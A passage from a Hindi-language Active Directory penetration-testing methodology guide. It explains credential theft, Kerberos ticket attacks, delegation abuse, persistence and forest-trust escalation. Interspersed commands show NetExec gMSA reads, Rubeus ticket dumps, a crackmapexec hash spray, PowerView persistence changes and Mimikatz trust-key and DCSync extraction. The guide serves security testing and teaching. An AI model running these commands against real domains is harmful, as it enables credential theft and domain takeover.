डिफ़ॉल्ट/NTLM bind का विफल होना इस finding को **अमान्य नहीं** करता: `-k`, ऐसा FQDN जो DC पर resolve होता हो, और KDC के साथ synchronized clock का उपयोग करके जाँचें। सफल module runs, candidate lists और प्राप्त ccaches को `~/.nxc/modules/pre2k/` के नीचे लिखते हैं।<sup>[[18]](#references)[[20]](#references)</sup>

Computer principal से समझौता करने के बाद, उसकी nested group memberships और outbound rights का graph बनाएँ। विशेष रूप से, gMSA के `msDS-GroupMSAMembership` security descriptor में नामित principals `msDS-ManagedPassword` पढ़ सकते हैं; NetExec का `--gmsa` output, अनुमत principals दिखाता है और जब authenticating computer अधिकृत होता है, तो मौजूदा NT hash देता है।<sup>[[19]](#references)[[20]](#references)</sup>

```bash
# Enumerate gMSAs and their password readers with the initial user
netexec ldap dc.corp.local -u auditor -p 'Password!' --gmsa

# Re-query as the compromised computer through Kerberos
netexec ldap dc.corp.local -u 'APP01$' -p app01 -k --gmsa
```

फिर recovered gMSA का मूल्यांकन किसी भी अन्य credential की तरह करें: local/domain group membership, logon rights, SPNs, delegation और पहुंच योग्य services की जांच करें, उसके बाद pass-the-hash आज़माएं। यह ACL-आधारित retrieval path, [Golden gMSA/dMSA](golden-dmsa-gmsa.md) से अलग है, जो KDS root-key compromise के बाद managed passwords derive करता है।<sup>[[20]](#references)</sup>

किसी computer principal का अन्य computer objects या groups पर outbound control भी हो सकता है। एक प्राप्त करने के बाद, उसकी nested memberships और effective ACLs की अलग-अलग जांच करें: किसी अन्य computer object पर write right से account change संभव हो सकता है, और group membership rights से logon role मिल सकता है। Staged-account flag, predictable naming convention या `GenericWrite` edge अकेले पूरे path को साबित नहीं करते।

किसी file, share या backup में `msDS-ManagedPassword` blob की पढ़ने योग्य प्रति मिलना exposure का एक अलग path है: LDAP read ACL कहीं और संग्रहीत प्रति की सुरक्षा नहीं कर सकता। इसकी व्याख्या करने से पहले पुष्टि करें कि data managed-password blob है, और इसे authorized LDAP read तथा KDS root-key derivation—दोनों से अलग समझें।

### Kerberoast

Kerberoasting में user accounts से जुड़ी services द्वारा इस्तेमाल किए जाने वाले **TGS tickets** प्राप्त किए जाते हैं और उनकी encryption को **offline** crack किया जाता है—यह encryption user passwords पर आधारित होती है।

इसके बारे में अधिक जानकारी:


{{#ref}}
kerberoast.md
{{#endref}}

### Remote connection (RDP, SSH, FTP, Win-RM, etc.)

कुछ credentials प्राप्त करने के बाद, जांचें कि क्या आपको किसी **machine** तक access है। इसके लिए, अपने port scans के अनुसार अलग-अलग protocols का उपयोग करके कई servers से connect करने की कोशिश **CrackMapExec** से कर सकते हैं।

### Local Privilege Escalation

यदि आपने credentials या एक regular domain user के रूप में session compromise किया है और domain की **किसी भी machine** तक access कर सकते हैं, तो **स्थानीय रूप से privileges escalate करने और credentials इकट्ठा करने** का path तलाशें। Local administrator privileges से memory (LSASS) और local storage (SAM) में मौजूद **अन्य users के hashes dump** किए जा सकते हैं।

इस book में [**Windows में local privilege escalation**](../windows-local-privilege-escalation/index.html) पर एक पूरा page और एक [**checklist**](../checklist-windows-privilege-escalation.md) है। [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) का उपयोग करना भी न भूलें।

### Current Session Tickets

मौजूदा user के **tickets** में आपको अप्रत्याशित resources तक access की permission **देने वाले tickets** मिलना बहुत **असंभावित** है, लेकिन आप जांच सकते हैं:

```bash
## List all tickets (if not admin, only current user tickets)
.\Rubeus.exe triage
## Dump the interesting one by luid
.\Rubeus.exe dump /service:krbtgt /luid:<luid> /nowrap
[IO.File]::WriteAllBytes("ticket.kirbi", [Convert]::FromBase64String("<BASE64_TICKET>"))
```

### NTLM Relay

Domain credentials या user session मिलने पर, NTLM [**relay attacks**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack) पर दोबारा गौर करें: authenticated enumeration और coercion techniques से ऐसे relay paths सामने आ सकते हैं जो unauthenticated reconnaissance के दौरान उपलब्ध नहीं थे।

### Computer Shares | SMB Shares में Creds ढूँढ़ें

अब जब आपके पास कुछ बुनियादी credentials हैं, तो जाँचें कि क्या आप **AD के अंदर साझा की गई कोई दिलचस्प फ़ाइलें ढूँढ़** सकते हैं। आप यह मैन्युअल रूप से कर सकते हैं, लेकिन यह बहुत उबाऊ और दोहराव वाला काम है (खासकर तब, जब आपको ऐसी सैकड़ों docs मिलें जिन्हें जाँचना हो)।

[**उन tools के बारे में जानने के लिए इस लिंक पर जाएँ जिनका आप उपयोग कर सकते हैं।**](../../network-services-pentesting/pentesting-smb/index.html#domain-shared-folders-search)

### Steal NTLM Creds

अगर आप **अन्य PCs या shares तक पहुँच सकते हैं**, तो आप **फ़ाइलें रख** सकते हैं (जैसे SCF file), जिन्हें किसी तरह access किए जाने पर आपके विरुद्ध t**rigger an NTLM authentication** होगा, ताकि आप **NTLM challenge चुरा** सकें और उसे crack कर सकें:


{{#ref}}
../ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### CVE-2021-1675/CVE-2021-34527 PrintNightmare

इस vulnerability के कारण कोई भी authenticated user **domain controller को compromise** कर सकता था।


{{#ref}}
printnightmare.md
{{#endref}}

## Privileged credentials/session के साथ Active Directory में privilege escalation

**नीचे दी गई techniques के लिए regular domain user पर्याप्त नहीं है; इन attacks को करने के लिए आपको कुछ विशेष privileges/credentials चाहिए।**

### Hash extraction

उम्मीद है कि आपने [AsRepRoast](asreproast.md), [Password Spraying](password-spraying.md), [Kerberoast](kerberoast.md), relaying सहित [Responder](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md), [EvilSSDP](../../generic-methodologies-and-resources/pentesting-network/spoofing-ssdp-and-upnp-devices.md), या [स्थानीय रूप से privileges बढ़ाकर](../windows-local-privilege-escalation/index.html) किसी **local admin** account को **compromise** कर लिया होगा।\
अब, memory और स्थानीय रूप से मौजूद सभी hashes dump करने का समय है।\
[**Hashes प्राप्त करने के अलग-अलग तरीकों के बारे में इस page को पढ़ें।**](https://github.com/carlospolop/hacktricks/blob/master/windows-hardening/active-directory-methodology/broken-reference/README.md)

### Pass the Hash

**किसी user का hash मिलने के बाद**, आप उसका **impersonate** कर सकते हैं।\
आपको ऐसे **tool** का उपयोग करना होगा जो उस **hash का इस्तेमाल करके NTLM authentication** **करे**, **या** आप नया **sessionlogon** बना सकते हैं और उस **hash को LSASS में inject** कर सकते हैं, ताकि कोई भी **NTLM authentication होने पर उस hash का उपयोग हो।** यही आखिरी तरीका mimikatz इस्तेमाल करता है।\
[**अधिक जानकारी के लिए यह page पढ़ें।**](../ntlm/index.html#pass-the-hash)

### Over Pass the Hash/Pass the Key

इस attack का उद्देश्य **user NTLM hash का इस्तेमाल करके Kerberos tickets माँगना** है, जो NTLM protocol पर आम Pass The Hash का विकल्प है। इसलिए, यह उन networks में खास तौर पर **उपयोगी हो सकता है जहाँ NTLM protocol disabled है** और authentication protocol के रूप में केवल **Kerberos की अनुमति है**।


{{#ref}}
over-pass-the-hash-pass-the-key.md
{{#endref}}

### Pass the Ticket

**Pass The Ticket (PTT)** attack method में, attackers किसी user के password या hash values के बजाय उसका **authentication ticket चुराते हैं**। फिर इस चोरी हुए ticket का इस्तेमाल **user को impersonate करने** और network के resources तथा services तक अनधिकृत पहुँच पाने के लिए किया जाता है।


{{#ref}}
pass-the-ticket.md
{{#endref}}

### Credentials का पुनः उपयोग

अगर आपके पास किसी **local administrator** का **hash** या **password** है, तो उससे दूसरे **PCs** पर **स्थानीय रूप से login करने** की कोशिश करें।

```bash
# Local Auth Spray (once you found some local admin pass or hash)
## --local-auth flag indicate to only try 1 time per machine
crackmapexec smb --local-auth 10.10.10.10/23 -u administrator -H 10298e182387f9cab376ecd08491764a0 | grep +
```

> [!WARNING]
> ध्यान दें कि यह काफ़ी **noisy** है और **LAPS** इसे **mitigate** कर सकता है।

### MSSQL का दुरुपयोग और Trusted Links

यदि किसी user के पास **MSSQL instances तक पहुँचने** के privileges हैं, तो वह MSSQL host पर **commands execute** कर सकता है (यदि वह SA के रूप में चल रहा हो), NetNTLM **hash चुरा** सकता है या **relay attack** भी कर सकता है।\
यदि एक MSSQL instance को किसी अन्य instance ने database link के ज़रिए trusted किया है, तो linked database पर privileges रखने वाला user **trust relationship का उपयोग करके दूसरे instance पर queries execute** कर सकता है। इन trusts को एक-दूसरे से जोड़ा जा सकता है और अंततः ऐसे misconfigured database तक पहुँचा जा सकता है जहाँ user commands execute कर सके।\
**Databases के बीच links forest trusts के पार भी काम करते हैं।**


{{#ref}}
abusing-ad-mssql.md
{{#endref}}

### IT asset/deployment platforms का दुरुपयोग

Third-party inventory और deployment suites अक्सर credentials और code execution तक पहुँचने के शक्तिशाली रास्ते देते हैं। देखें:

{{#ref}}
sccm-management-point-relay-sql-policy-secrets.md
{{#endref}}

{{#ref}}
lansweeper-security.md
{{#endref}}

### Unconstrained Delegation

यदि आपको कोई Computer object मिले जिसमें [ADS_UF_TRUSTED_FOR_DELEGATION](<https://msdn.microsoft.com/en-us/library/aa772300(v=vs.85).aspx>) attribute हो और आपके पास उस computer पर domain privileges हों, तो आप computer की memory से उसमें login करने वाले हर user के TGTs dump कर सकते हैं।\
इसलिए, यदि कोई **Domain Admin computer में login करता है**, तो आप उसका TGT dump करके [Pass the Ticket](pass-the-ticket.md) का उपयोग कर उसका impersonate कर सकते हैं।\
Constrained delegation की मदद से आप **Print Server को अपने-आप compromise** भी कर सकते हैं (उम्मीद है कि वह DC होगा)।


{{#ref}}
unconstrained-delegation.md
{{#endref}}

### Constrained Delegation

यदि किसी user या computer को "Constrained Delegation" की अनुमति है, तो वह **किसी computer पर कुछ services तक पहुँचने के लिए किसी भी user का impersonate** कर सकता है।\
फिर, यदि आप इस user/computer का **hash compromise** कर लेते हैं, तो आप कुछ services तक पहुँचने के लिए **किसी भी user** (यहाँ तक कि domain admins) का impersonate कर सकेंगे।


{{#ref}}
constrained-delegation.md
{{#endref}}

### Resource-based Constrained Delegation

किसी remote computer के Active Directory object पर **WRITE** privilege होने से **elevated privileges** के साथ code execution हासिल किया जा सकता है:


{{#ref}}
resource-based-constrained-delegation.md
{{#endref}}

### Permissions/ACLs का दुरुपयोग

Compromised user के पास कुछ domain objects पर **दिलचस्प privileges** हो सकते हैं, जिनसे आप बाद में lateral **move** कर सकते हैं या privileges **escalate** कर सकते हैं।


{{#ref}}
acl-persistence-abuse/
{{#endref}}

### Printer Spooler service का दुरुपयोग

Domain में **Spool service listening** का पता चलने पर उसका **दुरुपयोग** करके **नए credentials हासिल** किए जा सकते हैं और **privileges escalate** किए जा सकते हैं।


{{#ref}}
printers-spooler-service-abuse.md
{{#endref}}

### Third-party sessions का दुरुपयोग

यदि **अन्य users** **compromised** machine तक **पहुँचते** हैं, तो **memory से credentials इकट्ठा** करना और उनका impersonate करने के लिए उनकी processes में **beacons inject** करना भी संभव है।\
आमतौर पर users RDP के ज़रिए system तक पहुँचते हैं, इसलिए यहाँ third-party RDP sessions पर कुछ attacks करने का तरीका दिया गया है:


{{#ref}}
rdp-sessions-abuse.md
{{#endref}}

### LAPS

**LAPS** domain-joined computers पर **local Administrator password** को manage करने की प्रणाली देता है, जो सुनिश्चित करती है कि password **randomized**, unique और बार-बार **changed** हो। ये passwords Active Directory में stored होते हैं और केवल authorized users को ACLs के ज़रिए access दिया जाता है। इन passwords तक पहुँचने के पर्याप्त permissions होने पर अन्य computers तक pivot करना संभव हो जाता है।


{{#ref}}
laps.md
{{#endref}}

### Certificate Theft

Compromised machine से **certificates इकट्ठा** करना environment में privileges escalate करने का एक तरीका हो सकता है:


{{#ref}}
ad-certificates/certificate-theft.md
{{#endref}}

### Certificate Templates का दुरुपयोग

यदि **vulnerable templates** configured हैं, तो privileges escalate करने के लिए उनका दुरुपयोग किया जा सकता है:


{{#ref}}
ad-certificates/domain-escalation.md
{{#endref}}

## High privilege account के साथ Post-exploitation

### Domain Credentials dump करना

एक बार **Domain Admin** या इससे भी बेहतर **Enterprise Admin** privileges मिलने पर, आप **domain database**: _ntds.dit_ को **dump** कर सकते हैं।

[**DCSync attack के बारे में अधिक जानकारी यहाँ मिल सकती है**](dcsync.md).

[**NTDS.dit चुराने के तरीके के बारे में अधिक जानकारी यहाँ मिल सकती है**](https://github.com/carlospolop/hacktricks/blob/master/windows-hardening/active-directory-methodology/broken-reference/README.md)

`ntds.dit` और `SYSTEM` hive वाली readable backup archive को extraction से पहले ही exposed directory material माना जाना चाहिए। पुराना password hash होने से अन्य object attributes सुरक्षित नहीं हो जाते: `description` जैसे fields में credentials या operational notes हो सकते हैं। पहले archive के member names जाँचें और extracted database contents को routine enumeration output से अलग रखें।

### Persistence के लिए Privesc

पहले चर्चा की गई कुछ techniques को persistence के लिए इस्तेमाल किया जा सकता है।\
उदाहरण के लिए, आप:

- Users को [**Kerberoast**](kerberoast.md) के प्रति vulnerable बना सकते हैं

  ```bash
  Set-DomainObject -Identity <username> -Set @{serviceprincipalname="fake/NOTHING"}r
  ```

- उपयोगकर्ताओं को [**ASREPRoast**](asreproast.md) के प्रति असुरक्षित बनाएं

  ```bash
  Set-DomainObject -Identity <username> -XOR @{UserAccountControl=4194304}
  ```

- किसी उपयोगकर्ता को [**DCSync**](#dcsync) विशेषाधिकार दें

  ```bash
  Add-DomainObjectAcl -TargetIdentity "DC=SUB,DC=DOMAIN,DC=LOCAL" -PrincipalIdentity bfarmer -Rights DCSync
  ```

### Silver Ticket

**Silver Ticket attack** में **NTLM hash** (उदाहरण के लिए, **PC account का hash**) का उपयोग करके किसी विशिष्ट service के लिए **वैध Ticket Granting Service (TGS) ticket** बनाया जाता है। इस तरीके का उपयोग **service privileges तक पहुँचने** के लिए किया जाता है।

{{#ref}}
silver-ticket.md
{{#endref}}

### Golden Ticket

**Golden Ticket attack** में attacker Active Directory (AD) environment में **krbtgt account का NTLM hash** हासिल करता है। यह account खास है, क्योंकि इसका उपयोग सभी **Ticket Granting Tickets (TGTs)** पर हस्ताक्षर करने के लिए किया जाता है। AD network में authentication के लिए ये ज़रूरी होते हैं।

यह hash हासिल करने के बाद, attacker अपनी पसंद के किसी भी account के लिए **TGTs** बना सकता है (Silver Ticket attack)।

{{#ref}}
golden-ticket.md
{{#endref}}

### Diamond Ticket

ये ऐसे golden tickets हैं जिन्हें **आम golden ticket detection mechanisms को bypass करने के लिए** forge किया जाता है।

{{#ref}}
diamond-ticket.md
{{#endref}}

### **Certificates Account Persistence**

**किसी account के certificates होना या उन्हें request कर पाना**, उस user के account में persistence बनाए रखने का एक बहुत अच्छा तरीका है (भले ही वह password बदल दे):

{{#ref}}
ad-certificates/account-persistence.md
{{#endref}}

### **Certificates Domain Persistence**

**Certificates का उपयोग करके domain के भीतर high privileges के साथ persistence बनाए रखना भी संभव है:**

{{#ref}}
ad-certificates/domain-persistence.md
{{#endref}}

### AdminSDHolder Group

Active Directory में **AdminSDHolder** object, **privileged groups** (जैसे Domain Admins और Enterprise Admins) पर एक मानक **Access Control List (ACL)** लागू करके उनकी सुरक्षा सुनिश्चित करता है। इससे अनधिकृत बदलाव रोके जाते हैं। हालाँकि, इस feature का दुरुपयोग किया जा सकता है: अगर attacker AdminSDHolder के ACL में बदलाव करके किसी आम user को full access दे दे, तो उस user को सभी privileged groups पर व्यापक नियंत्रण मिल जाता है। इस तरह, सुरक्षा के लिए बनाया गया यह उपाय उल्टा असर कर सकता है और अनुचित access दे सकता है—जब तक इसकी बारीकी से निगरानी न की जाए।

[**AdminDSHolder Group के बारे में अधिक जानकारी यहाँ है।**](privileged-groups-and-token-privileges.md#adminsdholder-group)

### DSRM Credentials

हर **Domain Controller (DC)** में एक **local administrator** account होता है। ऐसी machine पर admin rights हासिल करके, **mimikatz** का उपयोग करके local Administrator hash निकाला जा सकता है। इसके बाद, इस password का उपयोग **enable करने** के लिए registry में बदलाव करना ज़रूरी होता है, जिससे local Administrator account को remote access मिल सके।

{{#ref}}
dsrm-credentials.md
{{#endref}}

### ACL Persistence

आप किसी **user** को कुछ खास domain objects पर **विशेष permissions दे** सकते हैं, जिससे वह user **भविष्य में privileges escalate** कर सके।

{{#ref}}
acl-persistence-abuse/
{{#endref}}

### Security Descriptors

**Security descriptors** का उपयोग यह **store करने** के लिए किया जाता है कि किसी **object** के पास दूसरे **object** पर कौन-सी **permissions** हैं। अगर आप किसी object के **security descriptor** में बस **थोड़ा-सा बदलाव** कर सकें, तो privileged group का member बने बिना ही उस object पर बहुत उपयोगी privileges हासिल कर सकते हैं।

{{#ref}}
security-descriptors.md
{{#endref}}

### Dynamic Objects Anti-Forensics / Evasion

`dynamicObject` auxiliary class का दुरुपयोग करके `entryTTL`/`msDS-Entry-Time-To-Die` के साथ कम समय तक रहने वाले principals/GPOs/DNS records बनाएँ। ये tombstones छोड़े बिना खुद-ब-खुद delete हो जाते हैं और LDAP evidence मिटा देते हैं, लेकिन orphan SIDs, टूटे हुए `gPLink` references या cached DNS responses छोड़ सकते हैं (उदाहरण के लिए, AdminSDHolder ACE pollution या दुर्भावनापूर्ण `gPCFileSysPath`/AD-integrated DNS redirects)।

{{#ref}}
ad-dynamic-objects-anti-forensics.md
{{#endref}}

### Skeleton Key

**Universal password** सेट करने के लिए memory में **LSASS** को बदलें, जिससे सभी domain accounts तक access मिल जाता है।

{{#ref}}
skeleton-key.md
{{#endref}}

### Custom SSP

[यहाँ जानें कि SSP (Security Support Provider) क्या है।](../authentication-credentials-uac-and-efs/index.html#security-support-provider-interface-sspi)\
आप machine तक पहुँचने के लिए इस्तेमाल किए गए **credentials** को **clear text** में **capture** करने के लिए अपना **SSP** बना सकते हैं।

{{#ref}}
custom-ssp.md
{{#endref}}

### DCShadow

यह AD में एक **नया Domain Controller** register करता है और उसका उपयोग निर्दिष्ट objects पर **attributes** (SIDHistory, SPNs...) **push करने** के लिए करता है। इन **बदलावों** से जुड़े कोई **logs** नहीं छूटते। इसके लिए आपके पास **DA** privileges होने चाहिए और आप **root domain** के भीतर होने चाहिए।\
ध्यान दें कि गलत data इस्तेमाल करने पर बहुत ही बुरे logs दिखाई देंगे।

{{#ref}}
dcshadow.md
{{#endref}}

### LAPS Persistence

पहले हमने चर्चा की थी कि **LAPS passwords पढ़ने की पर्याप्त permission** होने पर privileges कैसे escalate किए जा सकते हैं। हालाँकि, इन passwords का उपयोग **persistence बनाए रखने** के लिए भी किया जा सकता है।\
देखें:

{{#ref}}
laps.md
{{#endref}}

## Forest Privilege Escalation - Domain Trusts

Microsoft **Forest** को security boundary मानता है। इसका अर्थ है कि **एक domain compromise होने से संभावित रूप से पूरा Forest compromise हो सकता है**।<sup>[[1]](#references)</sup>

### Basic Information

[**Domain trust**](<http://technet.microsoft.com/en-us/library/cc759554(v=ws.10).aspx>) एक security mechanism है, जो एक **domain** के user को दूसरे **domain** के resources तक पहुँचने देता है। यह मूल रूप से दोनों domains के authentication systems के बीच एक link बनाता है, जिससे authentication verification आसानी से हो पाता है। जब domains trust स्थापित करते हैं, तो वे अपने **Domain Controllers (DCs)** के बीच विशिष्ट **keys** का आदान-प्रदान करते हैं और उन्हें सुरक्षित रखते हैं। ये keys trust की अखंडता के लिए ज़रूरी हैं।

आम तौर पर, अगर कोई user किसी **trusted domain** में service तक पहुँचना चाहता है, तो उसे पहले अपने domain के DC से एक खास ticket, जिसे **inter-realm TGT** कहते हैं, request करना होगा। यह TGT एक साझा **key** से encrypted होता है, जिस पर दोनों domains सहमत होते हैं। इसके बाद user इस TGT को **trusted domain के DC** के सामने पेश करके service ticket (**TGS**) हासिल करता है। Trusted domain का DC inter-realm TGT की सफलतापूर्वक validation करने के बाद TGS जारी करता है, जिससे user को उस service तक access मिल जाता है।

**चरण**:

1. **Domain 1** का एक **client computer**, अपने **NTLM hash** का उपयोग करके अपने **Domain Controller (DC1)** से **Ticket Granting Ticket (TGT)** request करके प्रक्रिया शुरू करता है।
2. Client का authentication सफल होने पर DC1 एक नया TGT जारी करता है।
3. इसके बाद client, **Domain 2** के resources तक पहुँचने के लिए ज़रूरी **inter-realm TGT**, DC1 से request करता है।
4. यह inter-realm TGT, DC1 और DC2 के बीच two-way domain trust के हिस्से के रूप में साझा **trust key** से encrypted होता है।
5. Client inter-realm TGT को **Domain 2 के Domain Controller (DC2)** के पास ले जाता है।
6. DC2 अपनी साझा trust key का उपयोग करके inter-realm TGT की जाँच करता है और, अगर यह मान्य हो, तो उस server के लिए **Ticket Granting Service (TGS)** जारी करता है जिसे client Domain 2 में access करना चाहता है।
7. अंत में, client यह TGS server के सामने पेश करता है। यह server के account hash से encrypted होता है और Domain 2 में service तक access देता है।

### Different trusts

यह ध्यान रखना ज़रूरी है कि **trust one-way या two-way हो सकता है**। Two-way trust में दोनों domains एक-दूसरे पर trust करते हैं। लेकिन **one-way** trust relation में एक domain **trusted** और दूसरा **trusting** domain होता है। इस स्थिति में, आप केवल trusted domain से trusting domain के resources तक पहुँच सकते हैं।

अगर Domain A, Domain B पर trust करता है, तो A trusting domain है और B trusted domain। इसके अलावा, **Domain A** में यह **Outbound trust** होगा और **Domain B** में **Inbound trust**।

**अलग-अलग trusting relationships**

- **Parent-Child Trusts**: यह एक ही forest के भीतर आम setup है, जहाँ child domain अपने parent domain के साथ अपने-आप two-way transitive trust स्थापित करता है। इसका अर्थ है कि authentication requests parent और child के बीच आसानी से आ-जा सकती हैं।
- **Cross-link Trusts**: इन्हें "shortcut trusts" भी कहते हैं। ये referral प्रक्रिया तेज़ करने के लिए child domains के बीच स्थापित किए जाते हैं। जटिल forests में authentication referrals को आम तौर पर forest root तक ऊपर और फिर target domain तक नीचे जाना पड़ता है। Cross-links बनाने से यह रास्ता छोटा हो जाता है, जो खास तौर पर भौगोलिक रूप से दूर-दूर स्थित environments में उपयोगी है।
- **External Trusts**: ये अलग-अलग, असंबंधित domains के बीच स्थापित किए जाते हैं और स्वभाव से non-transitive होते हैं। [Microsoft के documentation](<https://technet.microsoft.com/en-us/library/cc773178(v=ws.10).aspx>) के अनुसार, external trusts ऐसे domain के resources तक पहुँचने के लिए उपयोगी हैं जो current forest के बाहर हो और forest trust से जुड़ा न हो। External trusts में SID filtering से सुरक्षा बढ़ाई जाती है।
- **Tree-root Trusts**: ये forest root domain और नए जोड़े गए tree root के बीच अपने-आप स्थापित हो जाते हैं। आम तौर पर कम देखने को मिलने के बावजूद, forest में नए domain trees जोड़ने के लिए tree-root trusts महत्वपूर्ण हैं। ये उन्हें एक unique domain name बनाए रखने और two-way transitivity सुनिश्चित करने देते हैं। अधिक जानकारी [Microsoft की guide](<https://technet.microsoft.com/en-us/library/cc773178(v=ws.10).aspx>) में मिल सकती है।
- **Forest Trusts**: यह दो forest root domains के बीच two-way transitive trust होता है। सुरक्षा बढ़ाने के लिए इसमें भी SID filtering लागू होती है।
- **MIT Trusts**: ये non-Windows, [RFC4120-compliant](https://tools.ietf.org/html/rfc4120) Kerberos domains के साथ स्थापित किए जाते हैं। MIT trusts कुछ विशेष प्रकार के environments के लिए हैं, जिन्हें Windows ecosystem के बाहर Kerberos-based systems के साथ integration की ज़रूरत होती है।

#### **Trusting relationships** में अन्य अंतर

- Trust relationship **transitive** (A, B पर trust करता है और B, C पर, तो A, C पर भी trust करता है) या **non-transitive** हो सकता है।
- Trust relationship को **bidirectional trust** (दोनों एक-दूसरे पर trust करते हैं) या **one-way trust** (उनमें से केवल एक दूसरे पर trust करता है) के रूप में स्थापित किया जा सकता है।

### Attack Path

1. Trusting relationships को **enumerate** करें।
2. जाँचें कि क्या किसी **security principal** (user/group/computer) को **दूसरे domain** के resources तक **access** है—शायद ACE entries के ज़रिए या दूसरे domain के groups में शामिल होने के कारण। **Domains के बीच relationships** खोजें (संभवतः इसी वजह से trust बनाया गया था)।
   1. इस स्थिति में kerberoast भी एक विकल्प हो सकता है।
3. उन **accounts** को **compromise** करें जो domains के बीच **pivot** कर सकते हैं।

दूसरे domain के resources तक access रखने वाले attackers आम तौर पर इन तीन तरीकों का उपयोग करते हैं:

- **Local Group Membership**: Principals को machines के local groups में जोड़ा जा सकता है, जैसे किसी server पर “Administrators” group में। इससे उन्हें उस machine पर व्यापक नियंत्रण मिलता है।
- **Foreign Domain Group Membership**: Principals foreign domain के groups के member भी हो सकते हैं। हालाँकि, इस तरीके की प्रभावशीलता trust की प्रकृति और group के scope पर निर्भर करती है।
- **Access Control Lists (ACLs)**: Principals को किसी **ACL** में, खास तौर पर **DACL** के भीतर **ACEs** में entities के रूप में, निर्दिष्ट किया जा सकता है। इससे उन्हें विशिष्ट resources तक access मिलता है। ACLs, DACLs और ACEs के काम करने के तरीके को विस्तार से समझने के लिए “[An ACE Up The Sleeve](https://specterops.io/assets/resources/an_ace_up_the_sleeve.pdf)” नाम का whitepaper एक बेहद उपयोगी resource है।<sup>[[17]](#references)</sup>

### Find external users/groups with permissions

Domain में foreign security principals खोजने के लिए **`CN=<user_SID>,CN=ForeignSecurityPrincipals,DC=domain,DC=com`** जाँचें। ये **किसी बाहरी domain/forest** के user/group होंगे।

आप इसे **Bloodhound** या powerview का उपयोग करके जाँच सकते हैं:

```powershell
# Get users that are i groups outside of the current domain
Get-DomainForeignUser

# Get groups inside a domain with users our
Get-DomainForeignGroupMember
```

### Child-to-Parent forest privilege escalation

```bash
# From PowerView
Get-DomainTrust

SourceName      : sub.domain.local    --> current domain
TargetName      : domain.local        --> foreign domain
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : WITHIN_FOREST       --> WITHIN_FOREST: Both in the same forest
TrustDirection  : Bidirectional       --> Trust direction (2ways in this case)
WhenCreated     : 2/19/2021 1:28:00 PM
WhenChanged     : 2/19/2021 1:28:00 PM
```

डोमेन trusts को enumerate करने के अन्य तरीके:

```bash
# Get DCs
nltest /dsgetdc:<DOMAIN>

# Get all domain trusts
nltest /domain_trusts /all_trusts /v

# Get all trust of a domain
nltest /dclist:sub.domain.local
nltest /server:dc.sub.domain.local /domain_trusts /all_trusts
```

> [!WARNING]
> **2 trusted keys** हैं, एक _Child --> Parent_ के लिए और दूसरा _Parent_ --> _Child_ के लिए।\
> वर्तमान डोमेन द्वारा उपयोग की जाने वाली कुंजी आप इस कमांड से प्राप्त कर सकते हैं:
>
> ```bash
> Invoke-Mimikatz -Command '"lsadump::trust /patch"' -ComputerName dc.my.domain.local
> Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\mcorp$"'
> ```

#### SID-History Injection

SID-History injection का उपयोग करके trust का दुरुपयोग करते हुए child/parent domain में Enterprise admin के रूप में अधिकार बढ़ाएँ:


{{#ref}}
sid-history-injection.md
{{#endref}}

#### Writeable Configuration NC का Exploit

यह समझना महत्वपूर्ण है कि Configuration Naming Context (NC) का exploit कैसे किया जा सकता है। Active Directory (AD) वातावरण में Configuration NC, forest में configuration data के लिए एक केंद्रीय repository के रूप में काम करता है। यह data forest के हर Domain Controller (DC) पर replicate होता है, और writable DCs में Configuration NC की writable copy रहती है। इसका exploit करने के लिए, आपके पास DC पर **SYSTEM privileges** होने चाहिए—बेहतर होगा कि child DC पर हों।

**GPO को root DC site से link करें**

Configuration NC के Sites container में AD forest के सभी domain-joined computers की sites की जानकारी होती है। किसी भी DC पर SYSTEM privileges के साथ काम करके, attackers GPOs को root DC sites से link कर सकते हैं। इससे इन sites पर लागू policies में बदलाव करके root domain को संभावित रूप से compromise किया जा सकता है।

विस्तृत जानकारी के लिए [Bypassing SID Filtering](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-4) पर research देखें।<sup>[[12]](#references)</sup>

**Forest में किसी भी gMSA को compromise करें**

एक attack vector में domain के privileged gMSAs को target करना शामिल है। KDS Root key, जो gMSAs के passwords की गणना के लिए आवश्यक है, Configuration NC में store होती है। किसी भी DC पर SYSTEM privileges के साथ, KDS Root key तक पहुँचना और पूरे forest में किसी भी gMSA के passwords की गणना करना संभव है।

विस्तृत analysis और step-by-step मार्गदर्शन यहाँ मिल सकता है:


{{#ref}}
golden-dmsa-gmsa.md
{{#endref}}

पूरक delegated MSA attack (BadSuccessor – migration attributes का दुरुपयोग):


{{#ref}}
badsuccessor-dmsa-migration-abuse.md
{{#endref}}

अतिरिक्त external research: [Golden gMSA Trust Attacks](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-5)।<sup>[[13]](#references)</sup>

**Schema change attack**

इस method के लिए धैर्य रखना ज़रूरी है—नए privileged AD objects बनने की प्रतीक्षा करनी होती है। SYSTEM privileges के साथ, attacker AD Schema में बदलाव करके किसी भी user को सभी classes पर पूरा control दे सकता है। इससे नए बनाए गए AD objects तक अनधिकृत पहुँच और उन पर control मिल सकता है।

आगे पढ़ने के लिए [Schema Change Trust Attacks](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-6) देखें।<sup>[[14]](#references)</sup>

**ADCS ESC5 के साथ DA से EA तक**

ADCS ESC5 vulnerability में Public Key Infrastructure (PKI) objects पर control हासिल करके ऐसा certificate template बनाया जाता है, जो forest के किसी भी user के रूप में authentication की अनुमति देता है। चूँकि PKI objects Configuration NC में होते हैं, writable child DC को compromise करने से ESC5 attacks करना संभव हो जाता है।

इसके बारे में अधिक जानकारी [From DA to EA with ESC5](https://specterops.io/blog/2023/05/16/from-da-to-ea-with-esc5/) में पढ़ें।<sup>[[15]](#references)</sup> जिन scenarios में ADCS मौजूद नहीं है, उनमें attacker आवश्यक components setup कर सकता है, जैसा कि [Escalating from Child Domain Admins to Enterprise Admins](https://www.pkisolutions.com/escalating-from-child-domains-admins-to-enterprise-admins-in-5-minutes-by-abusing-ad-cs-a-follow-up/) में बताया गया है।<sup>[[16]](#references)</sup>

### External Forest Domain - One-Way (Inbound) या bidirectional

```bash
Get-DomainTrust
